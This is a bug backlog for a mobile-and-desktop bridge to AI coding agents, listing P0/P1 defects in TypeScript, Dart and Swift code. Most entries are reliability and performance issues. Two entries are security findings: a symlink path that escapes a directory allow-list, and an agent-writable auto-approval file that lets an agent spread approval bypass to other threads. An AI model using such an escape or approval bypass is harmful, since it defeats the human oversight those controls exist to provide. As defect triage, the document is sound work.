# 未修复问题底册（2026-07-27 全报告挖掘）

> 来源：8 个提取代理通读 reviews/raw-agent-reports/ 全部 27 份 + 主规划，
> 提取 1109 条，剔除本轮已修/用户决策跳过项后 1054 条，按 id 与 file:line 去重后 **776 条**。
> 逐条修复前必须回到源码核实（报告可能过时）。用户决策跳过的认证收紧类未收录。

| 严重度 | 数量 |
|---|---|
| P0 | 24 |
| P1 | 171 |
| P2 | 343 |
| P3 | 238 |


## P0（24 条）

### Bridge

- `A2/P0-12` **[bug]** `packages/bridge/src/codex-process.ts:687` — approvalPolicy getter's ?? 'on-request' fallback pollutes collaboration-only set_permission_mode
  When _approvalPolicy is undefined (official resolvedSettings lacked it), websocket.ts:5011-5036 reads the getter's 'on-request' fallback as the current value and, for collaboration-only changes, writes it into session.codexSettings via all three apply paths (next_turn, in-place, restart); the restart path really rebuilds the thread as on-request. Add a non-fallback resolvedApprovalPolicy getter and omit the field when unknown.
- `2` **[bug]** `packages/bridge/src/codex-process.ts:1961` — transport error handler skips rejectAllPending/cleanup; spawn ENOENT hangs bootstrap
  On spawn failure (codex CLI not installed) Node emits only error+close, never exit; the stdio transport listens only for exit, and codex-process's error handler neither rejects pendingRpc nor clears this.transport nor stops it. bootstrap's untimed await request('initialize') hangs forever and isRunning stays true so writeEnvelope keeps writing to a dead stdin. Also core-report A3.
- `P0-15` **[logic]** `packages/bridge/src/codex-process.ts:2446` — 审批解决后无条件 setStatus("running") 导致会话永久无法输入
  codex-process.ts:2446-2451 在审批解决后无条件置 running，而同文件 :5010 的正确写法是 `this.setStatus(this.pendingTurnId ? "running" : "idle")`。没有进行中 turn 时也被置为 running，输入框永久禁用，只能重启会话。
- `1` **[logic]** `packages/bridge/src/codex-process.ts:2450` — Approval resolution unconditionally setStatus(running), session stuck forever
  resumeRunningIfNoPendingInteractiveRequest sets status to running without checking pendingTurnId. When turn/completed arrives before the approval is resolved (interrupt, guardian review, multi-client), handleTurnCompleted nulls pendingTurnId but keeps waiting_approval; the later approve/reject then sets running with no turn left to pull it back to idle, so isWaitingForInput stays false and the session can never accept input again. Correct pattern exists at handleServerRequestResolved:5010. Also core-report A7.
- `B1/P0-13` **[bug]** `packages/bridge/src/codex-process.ts:4331` — pendingPlanCompletion lives only in CodexProcess memory; permission/sandbox restart loses it
  The synthetic plan_<uuid> permission_request is stored solely in this.pendingPlanCompletion with no persistence or handoff; destroySession during permission/sandbox restart (websocket.ts:5453, 6240-6264) discards it while collaborationMode restores 'plan' in the new process. The session is then stuck with a generated plan that can never be approved/executed. Hand the pending plan over across restart or emit permission_resolved with an explanatory tip.
- `1` **[bug]** `packages/bridge/src/parser.ts:1143` — isPromptHistoryEntry misses 8 fields; bad import wipes entire prompt history
  The guard validates only 6 of 14 PromptHistoryImportEntry fields; a payload with clientStats as a string passes, then importEntries (prompt-history-store.ts:279) clears this.data.entries before iterating and incrementClientStat throws TypeError before saveBumped, leaving in-memory history emptied with no rollback — the next record_prompt_history persists the empty set. Numeric updatedAt also passes and poisons string-typed persisted fields via maxIso. Verified by execution. Also core-report B1.
- `1` **[bug]** `packages/bridge/src/sdk-process.ts:825` — interrupt() clears pendingPermissions without resolving; SDK control request hangs
  pendingPermissions.clear() never calls pending.resolve(), and the only fallback (waitForPermission's abort listener at 1364) is gated by pendingPermissions.has(toolUseId), which is already false. The SDK's processControlRequest awaits canUseTool forever, the CLI-side tool call blocks permanently, and the SDK's cancelControllers entry leaks. Trigger: user taps stop while status is waiting_approval.
- `2` **[bug]** `packages/bridge/src/sdk-process.ts:1388` — updateStatusFromMessage result branch also clears pendingPermissions without resolve
  When a turn produces result early (timeout/budget/interrupt) with permissions still pending, the case 'result' path only clears the Map and sets idle; a later approve() hits the 'no pending' early return at 934 and both Bridge and SDK sides wait forever. Report recommends a shared rejectAllPending(reason) used at 665/804/825/1388.
- `A-1/A12/P0-16` **[bug]** `packages/bridge/src/session.ts:1149` — Ephemeral side-chat child never destroyed after process exit; registry lists dead sessions
  proc.on('exit') only sets status 'idle' and both evictStaleIdleSessions()/idleSessionCount() exclude auxiliary sessions, while listEphemeralSideChats() never checks liveness. After an app-server crash/sleep/bootstrap failure the registry still shows the entry as idle, users type into a dead process, and since ephemeral threads are in-memory (path null) the transcript is unrecoverable. Destroy on exit for auxiliary sessions or expose alive state.

### Mobile

- `A1/P0-11` **[bug]** `apps/mobile/lib/features/chat_session/state/chat_session_state.dart:88` — Mobile state has no 'unknown'; mode toggles send invented on-request back to Bridge
  Codex permission fields default to onRequest/defaultPermissions with no unknown state, so when true policy is fullAccess but not yet received, setSessionModes (chat_session_cubit.dart:4253-4322) sends set_permission_mode{codexPermissionsMode:'default', approvalPolicy:'on-request'} on a mere Plan/execution toggle. Bridge maps that to on-request+workspace-write and, since sandbox differs, restarts the thread with the invented settings — actually reverting the session's permissions, matching the field reports. Fields must become nullable and unknown values must not be sent.
- `B1` **[logic]** `apps/mobile/lib/features/chat_session/widgets/chat_message_list.dart:279` — Preview routing duplicated across 3 entries with divergent results; inbox has no fallback
  Manual file browser goes to ArtifactPreviewScreen, agent references route 40+ source extensions to File Peek, and file_transfer_sheet.dart:264 calls MethodChannelArtifactQuickLookGateway().previewFile directly with no shouldTryQuickLook gate, no WebView fallback, and no unsupported translation (guaranteed failure on Android/macOS). The same report.html opens three different ways depending on entry point.
- `C-1/C12` **[bug]** `apps/mobile/lib/features/file_transfer/file_transfer_service.dart:662` — Failed cancel of a paused transfer pins a rejected Future; cancel dead forever
  cancelTransfer's paused branch uses paused.cancelRequest ??= _requestBridgeCancel(paused); if the bridge disconnects, returns cancel_busy, or the 15s timeout fires, the rejected Future stays pinned and every later cancel rethrows the same stale error, leaving checkpoint and .part on disk. The _drain catch path (:965-982) resets cancelRequest = null but this branch does not.
- `C-2/C13` **[bug]** `apps/mobile/lib/features/file_transfer/file_transfer_service.dart:917` — One paused task freezes the whole queue; 'start N pending' button no-ops
  _drain breaks whenever _pausedWork != null and _scheduleRecovery returns early on the same condition, so with auto-resume off a task paused by insufficient_storage/step_up_required blocks both receive and upload queues; the 'start N pending receives' button silently does nothing. Dropped chat attachments queue behind the paused task and sendMessage is blocked by waitForUploads.
- `2` **[bug]** `apps/mobile/lib/features/git/state/git_view_cubit.dart:95` — Git result streams are global broadcast without projectPath; cached cubits cross-talk
  GitViewCacheService keeps one GitViewCubit per session, and each listens to global diffResults/gitStageResults/gitCheckoutBranchResults streams whose messages carry no projectPath/sessionId. With sessions A and B open, A's results populate B's state so B's swipe stage/revert sends A's file paths against B's projectPath. The diff_result portion was fixed this session via P0-2 requestId correlation, but git_stage/git_checkout/etc. result correlation as described here is broader.
- **[l10n]** `apps/mobile/lib/l10n/app_zh.arb:358` — 77 orphan zh keys never generated by gen-l10n; finished translations are dead weight
  Keys like statusRunning/sandboxModeTitle/addMachine exist only in app_zh.arb and produce no getter (verified zero hits in app_localizations.dart), while the corresponding UI (session_visual_status.dart, session_mode_bar.dart, screenshot_sheet.dart) hardcodes English. Add the 77 keys to en/ja/ko and wire the UI to ARB.
- **[bug]** `apps/mobile/lib/models/local_features/protocol_host.dart:129` — tryDecode has no per-slot isolation; slot exceptions drop the whole WS frame
  FormatException/TypeError from a slot escapes to bridge_service:1872's catch, replacing the frame with 'Parse error'; nested batch carriers (subagent_history.messages, continuity .message) lose entire batches. messages.dart:1665 already degrades unknown types, making the local-feature channel more fragile than the core one. Fix: per-slot try/catch degrade.
- `A01` **[compat]** `apps/mobile/lib/models/local_features/slots/side_chat_protocol_slot.dart:508` — _sideChatRequireOnlyKeys rejects unknown fields; anti-forward-compatible
  Any new field from a newer Bridge (seq, providerSessionId, createdAt) throws, and since client_capabilities negotiation is type-name-only the Bridge keeps sending side_chat_event — new-Bridge + old-App turns the entire side chat feature into Parse errors (affects persisted/ephemeral slots too). Fix: ignore unknown fields; strict mode for tests only, or version the type name.
- `A-2` **[bug]** `apps/mobile/lib/models/messages.dart:1148` — history_page bare `as int` beforeSeq/nextBeforeSeq hangs pagination completer
  If Bridge omits beforeSeq/nextBeforeSeq (cursor migration already underway per nextBeforeCursor), TypeError throws before _completeRemoteHistoryPage runs, so the paging Completer never completes and 'load more' spins forever. Same fields use `as int? ?? 0` in history_delta/snapshot — three inconsistent styles.
- `A-1/A15` **[bug]** `apps/mobile/lib/models/messages.dart:2350` — HistoryEntry.fromJson bare Map cast: one bad entry kills whole history page
  json['message'] as Map throws on missing/null/list message (e.g. future tombstone entries) and seq as int? throws on 1.0; call sites 1139/1155/1178/1189 map without protection so the entire page/delta/snapshot is lost and the history_page completer hangs to timeout.
- `A18` **[bug]** `apps/mobile/lib/models/messages.dart:2733` — Uncontrolled tool input bare-cast to String in Bash branch and getters
  input['command'] as String? plus getters at 2526-2540/2594/2600 throw during build (R3) so the approval card cannot render and the session hard-sticks; the default branch already uses the safe _nonEmptyString.
- **[l10n]** `apps/mobile/lib/utils/tool_categories.dart:160` — getToolDisplayName uses 'required bool zh'; 58 tool names show English to ja/ko
  The highest-exposure chat copy (every tool-call bubble) is a zh/en binary switch, with all three call sites hardcoding zh: languageCode == 'zh' (tool_result_bubble.dart:239/466, assistant_bubble.dart:922). Japanese and Korean users see English tool names; move the 58 entries into ARB keyed by AppLocalizations.
- `1/D-1/D1` **[perf]** `apps/mobile/lib/widgets/bubbles/tool_result_bubble.dart:298` — _ImageGenerationResultCard.build calls mapper without itemCache: decode per rebuild
  generatedImageItemsFromToolResults is invoked inside build without itemCache, so each rebuild base64Decodes on the main isolate and yields a fresh Uint8List, giving a new MemoryImage cache key and full re-decode. Streaming/scroll/theme rebuilds fill the 100MiB ImageCache and can OOM low-end Android while dropping frames. (Same defect as artifact report D1.)

### iOS native

- `A-1/P0-20` **[bug]** `apps/mobile/ios/Runner/NotificationActionHostPlugin.swift:52` — Default ISO8601DateFormatter rejects fractional seconds; long-press actions dead
  The parse gate uses ISO8601DateFormatter() without .withFractionalSeconds, but production occurredAt always carries milliseconds (Dart toIso8601String, Bridge toISOString), so capture() returns false, AppDelegate falls to super, and the Dart fallback drops the action on occurredAt == null; Allow/Reject from notifications silently never works on device. The unit test passes only because its fixture has no fractional seconds.

### menubar

- `P0-21` **[bug]** `apps/menubar/CCPocketMenubar/Models/UsageInfo.swift:11` — 菜单栏用量重置倒计时永远显示 "—"（同类日期解析 bug 的独立站点）
  `ISO8601DateFormatter().date(from: resetsAt)` 无法解析 usage.ts:60 `new Date(...).toISOString()` 必带的 .000Z 小数秒 → resetsAtDate 恒为 nil → resetsInText(:17) 走 `guard else { return "—" }`。该功能从未正常工作过；apps/menubar 全目录零测试使其完全逃逸。


## P1（171 条）

### Bridge

- `D3` **[perf]** `packages/bridge/src/codex-desktop-continuity.ts:337` — Unresolvable rollout: full ~/.codex/sessions scan per attempt plus infinite 8s tracker retry
  findCodexSessionJsonlPath (sessions-index.ts:3417) recursively lists all session files with no cache and opens each to read the first line; failures are not cached so every retry repeats the full scan. The Dart tracker retries rollout_unavailable forever (only path_not_allowed/continuity_binding_mismatch are suppressed, backoff capped at 8s, no max attempts), so one unresolvable session means a full directory scan every 8 seconds indefinitely.
- `D4(v2)/E5` **[perf]** `packages/bridge/src/codex-desktop-continuity.ts:344` — admitSupportedInput does monitorFor on every user input; failure never negative-cached
  Every Codex input awaits monitorFor(threadId) on the critical send path; when the thread's rollout cannot be resolved, monitorFor throws each time without caching the failure, so every single message pays the full-scan cost of D3 and input latency scales with the user's Codex history size. Fix: TTL negative cache for failed threadIds, resolve off the input path.
- `D4` **[bug]** `packages/bridge/src/codex-desktop-continuity.ts:351` — Rehydrate permanent failure has no fail-open; user messages queue forever
  staleRuntimeSessionIds is cleared only on rehydrate success or session removal; after 3 failures only an advisory runtime_rehydrate_failed is sent while admitInput keeps returning queue/desktop_history_refreshing and admitCodexQueuedInputDrain keeps returning false. If rehydrateCodexSessionAfterExternalTurn keeps failing (e.g. history RPC broken, or session stuck 'running' per codex item 1), every user message stays queued forever with no actionable way out. Fix: max dwell time/failure count then fail-open with warning.
- `D1` **[bug]** `packages/bridge/src/codex-desktop-continuity.ts:577` — Watch ownership thrash between list tracker and chat page; 4s+ continuity blackouts
  registerWatch keys on (client, sessionId) with last-writer-wins and no event to the displaced owner; the home tracker and chat cubit share one WebSocket client, so the sequence unwatch(Rold)->watch(Rnew)->tracker's watch(list-X) displaces the open chat page, which drops mismatched-requestId events until its 4s ack timeout and backoff retry, during which no Desktop events reach the open chat. Each cycle also closes/recreates the monitor (fs.watch + up to 8MB re-seed). This is the v02-012 handoff item; fix by keying (client, sessionId, requestId) or explicitly notifying the displaced requestId.
- `B-6` **[bug]** `packages/bridge/src/codex-desktop-continuity.ts:587` — watchersByClient 以 (client, sessionId) 为键，last-write-wins 静默踢掉前一个订阅者
  home tracker 与打开的 chat cubit 共享同一个 WebSocket 客户端对象，后注册者踢掉前者且不通知，前者永不知情地停止收到 continuity 事件。应改引用计数或键加订阅者身份。
- `D2` **[leak]** `packages/bridge/src/codex-desktop-continuity.ts:589` — registerWatch 'Too many watchers' throw path never disposes freshly created monitor
  monitorFor has already inserted the monitor into this.monitors before registerWatch throws at 589-591; the catch at 306 sends rollout_unavailable but has no disposeMonitorIfUnused, leaving a 0-watcher monitor holding an fs.watch, a 750ms setInterval, and an open FileHandle until MAX_MONITORS(64) eviction.
- `D6` **[bug]** `packages/bridge/src/codex-desktop-continuity.ts:1233` — seed() drops the rollout line being appended at watch start (both halves lost)
  seed hands text.split('\n')'s trailing partial line to JSON.parse (fails, continue) then sets this.offset = info.size with an empty lineBuffer, so readPass starts after the partial line's first half while its second half parses as an invalid standalone line — the in-flight item is lost entirely. bytesRead < length can additionally skip unread bytes since offset is hard-set to info.size. (Labeled P2/D6 in one pass and P1/B4 in the other; taking P1.)
- `B2` **[bug]** `packages/bridge/src/codex-process.ts:1849` — stop() leaves pendingPlanCompletion and clears approvals without permission_resolved
  stop() clears pendingApprovals/pendingUserInputs but not pendingPlanCompletion (only prepareLaunch does), so getPendingPermission() keeps returning a zombie ExitPlanMode that session_list keeps restoring on Mobile. Cleared ordinary approvals get no terminal event either, leaving Mobile cards hanging until the next history replay. Emit permission_resolved (reason runtime_reset) for every cleared toolUseId and null the plan pointer.
- `B3` **[bug]** `packages/bridge/src/codex-process.ts:2365` — getPendingPermission exposes only one item (plan first); other pendings invisible in session_list
  The single-value SessionSummary.pendingPermission (session.ts:229-233,1348-1361) means that when a plan approval and a tool approval coexist, re-entering the session restores only the plan; the other waits for canonical history replay. This is v01 8.2's 'other pendings hidden' issue, still unresolved. Add a pendingPermissions array while keeping the legacy single field.
- `A4` **[leak]** `packages/bridge/src/codex-process.ts:2896` — bootstrap catch emits exit without stopping transport; orphan app-server per failure
  On thread/resume errors, fork contract validation throws, etc., the catch only emits messages, sets idle, and emits exit 1 — it never calls this.stop(). session.ts:1149's exit handler neither removes the session nor stops the process, so every failed bootstrap leaves a live codex app-server child; repeated retries grow the process count linearly.
- `E3` **[bug]** `packages/bridge/src/codex-process.ts:2919` — emit('exit',1) inside bootstrap catch can throw via sync listener, escaping the catch
  session.ts:1149's exit listener synchronously runs finish() (evictStaleIdleSessions -> destroy -> child.kill(), which can throw EPERM); a throw inside the catch block is not re-caught, turning void this.bootstrap(...) (1826) into a rejected floating promise and aborting the remaining cleanup mid-way. Process death is mitigated by the P0-4 global guard, but the half-completed error path remains.
- `5` **[bug]** `packages/bridge/src/codex-process.ts:3124` — prepareLaunch doesn't reset completion-fetch in-flight state; stale skills cross sessions
  _completionFetchInFlight/_completionFetchCooldownUntil survive stop()->start(); the new session's fetchCompletionEntities hits the in-flight early return so skills/apps are never fetched, while the old fetch's .then passes the stopped guard (stopped reset to false) and writes the old projectPath's skills into the new session and emits supported_commands. Trigger: project switch or permission restart. Also core-report E9.
- `A5/B-24` **[bug]** `packages/bridge/src/codex-process.ts:3373` — Empty-text input shares stop() sentinel and permanently kills runInputLoop
  'if (this.stopped || !pendingInput.text) break' means any sendInputStructured("") (reachable via session.ts:2044 drainCodexQueue and local-features, not just WS which trims) exits the loop; bootstrap's try then ends normally without emitting exit, stopping transport, or re-emitting input_ready, so isWaitingForInput is false forever while the UI shows idle. Fix: distinct stop sentinel, continue on empty text.
- `B11` **[leak]** `packages/bridge/src/codex-process.ts:3519` — stdoutBuffer line accumulation has no size cap; one giant line grows unbounded
  this.stdoutBuffer += chunk only sheds data at newline boundaries; a huge single-line JSON (large tool_result, base64 image) or corrupted never-newline output grows the string toward OOM. codex-desktop-continuity.ts has a MAX_LINE_BYTES=2MB guard for the same pattern, confirming an omission. Also flagged as a side-finding in bridge-parser-ts.md.
- `6` **[bug]** `packages/bridge/src/codex-process.ts:3720` — pendingApprovals/pendingUserInputs.set overwrites duplicate toolUseId silently
  All five set() sites (3720/3749/3781/3812/3837) lack duplicate-key checks; extractToolUseId falls back to itemId when approvalId/elicitationId are absent, so a command approval and item/permissions/requestApproval on the same item collide. The overwritten requestId never receives a JSON-RPC response, permanently blocking that turn on the app-server side. Also core-report E5(second pass).
- `3` **[logic]** `packages/bridge/src/codex-process.ts:4278` — Notifications dropped while _threadId still null (same-chunk microtask race)
  isForeignThreadNotification discards all thread/turn/item notifications when _threadId is empty, but _threadId is assigned only in the await continuation of thread/start, which runs after handleStdoutChunk's synchronous while loop. If the app-server writes the thread/start response and turn/started//item/* in one stdout chunk (common over pipes), those notifications are silently dropped: pendingTurnId never set, interrupt/steer broken, resume replay items lost. Also core-report E4(second pass).
- `7` **[logic]** `packages/bridge/src/codex-process.ts:4358` — handleTurnCompleted resolves pendingTurnCompletion without turnId ownership guard
  Unlike the guarded pendingTurnId reset at 4327, the tail resolve has no turnId check, so completions from goal continuation turns, review sub-turns, or Desktop-side turns (same threadId) prematurely release runInputLoop while the real turn is still running, and each non-local turn also emits a duplicate result bubble to the client (4295-4325). Also core-report E6(second pass).
- `8` **[leak]** `packages/bridge/src/codex-process.ts:4776` — toRpcInput writeFile failure leaks temp images and kills runInputLoop
  If await writeFile throws mid-way, already-written tempPaths are function-local and never cleaned, permanently leaking image temp files in tmpdir; the call site at 3382 has no try/catch so the exception escapes the runInputLoop while loop and terminates the whole session instead of skipping the message. Also core-report E10.
- `A6` **[bug]** `packages/bridge/src/codex-process.ts:4812` — request() has no default timeout; silent app-server means permanent hangs
  timeoutMs only applies when callers pass it, and bootstrap's thread/start//thread/resume (2735), turn/start (3481), and turn/interrupt (2001/2021) all omit it. A non-responding app-server leaves the promise pending forever and pendingRpc grows monotonically; only process-exit-driven rejectAllPending can unstick it.
- `A2/B-22` **[leak]** `packages/bridge/src/codex-transport.ts:108` — stop() sends only SIGTERM, nulls child immediately, no SIGKILL escalation or process group
  If the app-server ignores SIGTERM (long-running command) it lingers forever since this.child=null makes a follow-up kill impossible; grandchild tool processes are untouched (no detached/process group kill), and destroy() removes all listeners right after so even a late exit goes unobserved.
- `B-2` **[perf]** `packages/bridge/src/conversation-content-sync.ts:140` — catalog 刷新以 limit=10000 全量扫描并白读 lastPrompt
  默认 catalogReader 为 getAllRecentSessions({limit:10000})，触发全量扫描-解析-全排，并使 supplementLastPrompt（sessions-index.ts:1213-1231）对整个结果集缺 lastPrompt 的 Claude 条目做增长式 tail 读（每条最多 128 KB），而 catalog 只用到 provider/sessionId/modified。该刷新在每次 subscribe/warm、每个 unscoped change 及 45s~5min 冷扫定时器上反复执行。
- `B-1` **[perf]** `packages/bridge/src/conversation-content-sync.ts:849` — 每次增量推送都做全目录扫描 + 整个 JSONL 重解析
  任何 catalog 变化或运行时消息（websocket.ts:9778，每条非 delta 消息一次）→ enqueue → drain → readDurableHistory。Claude 侧 findSessionJsonlPath 逐个读所有项目的 sessions-index.json 再逐目录 stat；Codex 侧全树遍历并逐文件流读 session_meta；随后从头流式解析整个 JSONL。无 path 缓存、无 append-only 增量读；焦点会话 priority=0 时每个 tool_result 都触发一轮。用户数据规模 26 GiB × 2，最大 rollout 2.81 GB。
- `2/C2` **[bug]** `packages/bridge/src/file-transfer-state-store.ts:445` — 256-upload metadata cap with 7-day tombstones: 257th prepare fails for a week
  Completed uploads get retainUntil = now + 7 days, pruneDownloads never prunes uploads, and DEFAULT_MAX_UPLOADS=256 is not overridden; the 257th prepare within 7 days throws a plain Error mapped to upload_prepare_failed, and every prepare keeps failing until tombstones expire. Complete tombstones need a much shorter retention or updatedAt-based eviction at capacity.
- `1/C1` **[bug]** `packages/bridge/src/file-transfer-upload-store.ts:351` — Uncaught cleanup error on one expired .part permanently disables all uploads
  In cleanupExpiredLocked only recoverCommit is try/caught; the controlledPartialPath/unlinkIfSameInode branch can throw 409 (inode replaced, path rebind) before removeUpload runs, so the expired entry is never deleted and every subsequent init()/prepare() reruns and rethrows for unrelated transfers. Restart does not self-heal because initializeFileTransferRuntime catches the error and disables the whole file-transfer feature.
- `D2` **[bug]** `packages/bridge/src/local-features/auto-approval.ts:829` — Auto-approval state file writable by the agent itself, enabling cross-thread persistence
  ~/.ccpocket/auto-approval-v1.json is a plain user-writable file (0600 but same user as the agent) and ensureLoaded caches it once per process; via the C2 redirection bypass an auto-approved session can append other thread ids so they auto-approve after the next Bridge restart. Add the state file to a FileChange force-manual blacklist and validate mtime/inode before isActive; note the enabling bypass (C2) is under the skipped SEC-7 decision.
- `B-1` **[bug]** `packages/bridge/src/local-features/subagents.ts:834` — Subagent isActive uses hardcoded status-string whitelist; activeFlags sent but never parsed
  Bridge forwards status.type plus activeFlags, but Dart's isActive checks only {'active','running','pending','starting','working'} and no Dart code reads activeFlags at all (grep hits only the TS side). Official structured statuses like {type:'idle', activeFlags:['turn']} or unknown types render running subagents as Done, undermining the floating dock's 'running subagent' purpose. Parse activeFlags and treat non-empty as active.
- `2` **[bug]** `packages/bridge/src/parser.ts:1117` — normalizeToolResultContent crashes on null array element, killing the SDK stream
  .filter((c) => c.type === 'text') throws TypeError when the tool_result content array contains null (legal JSON); the call site sdk-process.ts:476 sits inside processMessages' for-await with no per-message try/catch, so one bad message terminates the whole session's message stream (all subsequent assistant/result lost). Also '.text as string' is unchecked and renders objects as '[object Object]'. Verified by execution. Also core-report B2.
- `5` **[bug]** `packages/bridge/src/parser.ts:1242` — start branch leaves 7 declared fields unvalidated; sessionId bypasses resume checks
  sessionId, continue, sandboxMode, useWorktree, worktreeBranch, existingWorktreePath, and provider are never validated; websocket.ts:3933 forwards msg.sessionId by calling handleClientMessage directly (bypassing parseClientMessage), so a non-string sessionId enters the resume chain ('[object Object]' ids, dirty resumeOperationKey), and an object worktreeBranch throws in worktree.ts:125 branch.replace. Also core-report B5.
- `3` **[logic]** `packages/bridge/src/parser.ts:1410` — Empty-string sessionId passes validation and silently routes to another session
  Required sessionId fields are checked only with typeof === 'string', so '' passes; websocket.ts:9595 resolveSession treats '' as falsy and returns getFirstSession(). update_queued_input/cancel_queued_input/steer_queued_input/get_goal/set_goal/clear_goal then silently mutate a different session's queued input or goal with no error. Also core-report B3.
- `4` **[bug]** `packages/bridge/src/parser.ts:2380` — Invalid payload and unknown type share return null; requestId requests hang forever
  A known-type message failing field validation is reported as errorCode 'unsupported_message' (client misreads as Bridge-too-old), and the error response carries no requestId; for resolve_artifact/read_file/read_artifact_source/get_history_page/get_history_tool_details/archive_session the client's pending future receives nothing and only times out. Distinct from the fixed P0-2 diff_result correlation. Also core-report B4.
- `7` **[leak]** `packages/bridge/src/sdk-process.ts:648` — start() has no reentry guard during async auth window; first query leaks orphan CLI
  queryInstance is only assigned at 733, so a second start() during the auth precheck sees null, skips stop(), and both startAfterAuthCheck calls reach query({...}): the first instance's reference is overwritten, close() is never called (orphan CLI subprocess and stdio leak), and two processMessages loops push to the same EventEmitter concurrently.
- `4/5` **[bug]** `packages/bridge/src/sdk-process.ts:777` — processMessages error path never resets queryInstance; dead instance reused forever
  The .catch at 777-786 sets idle and emits exit 1 but leaves this.queryInstance set, so isRunning (643) stays true; websocket.ts:2501/10819 reuse the dead instance and dispatchInput just queues indefinitely because userMessageResolve is null — the user sees 'sent' but never gets a response. Trigger: SDK iterator throws (CLI crash/EPIPE) while stopped === false.
- `3` **[leak]** `packages/bridge/src/sdk-process.ts:804` — stop()/start() clear pendingPermissions without resolving, leaking promises and payloads
  Same clear-without-resolve pattern on the stop and restart paths; close() does kill the CLI so impact is smaller than interrupt, but the unresolved promises, pending.input payloads (possibly large), and SDK cancelControllers entries all leak, and on start() restart the old query is left unresolved.
- `8` **[bug]** `packages/bridge/src/sdk-process.ts:838` — Inputs accepted after stop; start() never clears pendingInputQueue, leaking into new session
  dispatchInput pushes to pendingInputQueue with no stopped/isRunning guard, so post-stop or post-auth-failure inputs queue with no consumer; start() only pushes initialInput without resetting the queue, so leftover text from the old session is emitted as the first user turn of the next start. The auth-failure path (691-701) doesn't even set stopped=true.
- `6` **[bug]** `packages/bridge/src/sdk-process.ts:1216` — Restart race: old processMessages loop nulls the NEW queryInstance and fakes exit
  start() calls stop() then immediately resets stopped=false (662) while the old loop still hangs on the old iterator; when it ends, 'if (this.stopped) break' no longer fires and line 1299 nulls what may now be the new queryInstance, then emits session_end/idle/exit 0 against the new session; an error-terminated old iterator instead pushes 'SDK error' and exit 1 to the new session. Fix: run-generation token or local const q comparison.
- `B-5` **[bug]** `packages/bridge/src/session-catalog-monitor.ts:38` — watcher 上限 1024 按顺序耗尽，Codex 目录可能一个 watcher 都装不上且永不自愈
  defaultRoots() 顺序 claudeProjects → codexRoot → codexSessions 按序 await，~/.claude/projects 下项目 ≥1023 个时 Codex 目录拿不到配额；且 cap 在子目录层被打到时 rootInstalled=true → 不安排 rescan → 永久不自愈，Codex 会话变化再也不被监测。
- `C-18` **[logic]** `packages/bridge/src/session-catalog-monitor.ts:93` — catalogRevision 是进程内存计数，Bridge 重启归零导致陈旧缓存被误复用
  `private revision = 0` 每次 Bridge 重启从 0 重新计数，而分区键 bridgeInstanceId 跨重启稳定持久。手机缓存记录 complete_revision=N 后，Bridge 重启、离线期间目录变化、revision 再次到达 N 时重连 → canReuseCompleteCache 仅比较数值即命中 → hasMore=false 并把陈旧缓存与首页 20 条合并展示，已删除的会话复活且后续分页被封死。这是 02128669 + 6cddb80c 引入的最实质风险。
- `C3` **[bug]** `packages/bridge/src/session.ts:635` — commitReplacement drops history/Codex incremental state on Desktop takeover
  Only name/autoRename/queue/goal/status/lastActivityAt are migrated; history, historyEntries, historyRevision, historyLowWatermark, codexLatestUserInput, codexUserTurnUuidByRawId, pendingCodexUserEchoUuids, codexOrderedHistoryEntries, and canonical/reset revisions are not. PARTIALLY addressed this session by Candidate-B commitReplacement dedup fields (the UUID/echo dedup maps tied to duplicated-message symptoms); remaining unmigrated fields — notably codexLatestUserInput, which backs the keep-latest-user-input fallback in applyCodexCanonicalHistoryBaseline — still need verification/migration.
- `E2` **[bug]** `packages/bridge/src/session.ts:1103` — processMessage catch-all only console.errors; client gets no error, no degradation, no retry
  Failures in image registration, artifact materialization, or gallery writes make the message simply never appear on the client — no error message, no fallback rendering, no retry — with only a server-side console line as evidence.
- `C4` **[bug]** `packages/bridge/src/session.ts:1474` — mergeUserInputIntoHistory edits history in place without bumping revision/seq
  The merged message keeps the old seq, so getHistorySince filters it out forever; only clients live at that moment receive the UUID backfill via onMessage. Reconnecting/background-restored clients permanently keep the UUID-less user entry and consequently cannot rewind/fork from it.
- `C5/C7(v2)` **[bug]** `packages/bridge/src/session.ts:2360` — destroy() removes session from map before stop(); sync exit callback writes to dead session
  ownsRuntimeSlot() returns true for any non-replacement session, so the synchronous exit triggered by stop() runs the full finish(): appendHistoryToSession on the removed session, broadcastCodexQueue (external conversation_queue emission), and a recursive evictStaleIdleSessions. Fix: ownsRuntimeSlot should check this.sessions.get(id) === session.
- `B-3` **[perf]** `packages/bridge/src/sessions-index.ts:946` — getAllRecentSessions 每次调用都全量 hydrate/scanJsonl + 全树遍历 + 全量排序
  即使 limit=20 也会遍历全部项目目录并 hydrate/scanJsonl（:996-1095）、走全部 Codex rollout（:1097-1113 → listCodexSessionFiles 全树遍历）、全量排序后再 slice。无 mtime 缓存、无增量索引。
- `B-4` **[bug]** `packages/bridge/src/sessions-index.ts:1271` — Codex/Claude 路径全部硬编码 homedir，无 CODEX_HOME 支持
  grep CODEX_HOME 零命中、无 source registry，而 Codex 子进程（codex-transport.ts:47/59 env: process.env）会继承用户环境的 CODEX_HOME。Bridge 扫描目录与 app-server 实际写入目录可能不一致 → 会话列不出来或读不到历史。
- `SEC-4` **[bug]** `packages/bridge/src/websocket.ts:1573` — isPathAllowed 不解析 symlink，下游用 realpath → 白名单逃逸
  isPathAllowed 只做 path.resolve+normalize，而 worktree.ts:204-205、git-operations.ts:83-85 用 realpath。允许目录内的软链（~/proj/link -> /）即可逃逸：projectPath:"/Users/x/proj/link/etc" 字面上在 $HOME 内 → 通过，realpath 后 Agent 以 /etc 为 cwd 全权读写。get_diff/list_files/全部 git_*/list_worktrees 走同一条不一致路径。
- `A-2` **[leak]** `packages/bridge/src/websocket.ts:2308` — Zombie children permanently consume the 8-global/4-per-parent quota; no disconnect reclamation
  The quota counts listEphemeralSideChats() including A-1's zombies, and EphemeralSideChatFeatureHandler implements neither disconnect() nor close(), so children (each a full CodexProcess/app-server) persist after the phone app dies until Bridge restart. Eight zombies make open_ephemeral_side_chat fail forever with no in-app way to clear other parents' orphans. Needs an auxiliary idle-reclamation policy or live-only quota counting.
- `A4` **[bug]** `packages/bridge/src/websocket.ts:6046` — set_sandbox_mode compares against ?? 'workspace-write' and silently drops user action
  currentSandboxMode falls back to 'workspace-write' when unknown; if the real sandbox is danger-full-access and the user toggles sandbox on, newSandboxMode equals the fallback so the handler breaks with no reply, permanently forking Mobile's optimistic state from reality. Unknown must not be compared for equality — either actually apply or reply with an unknown indicator.
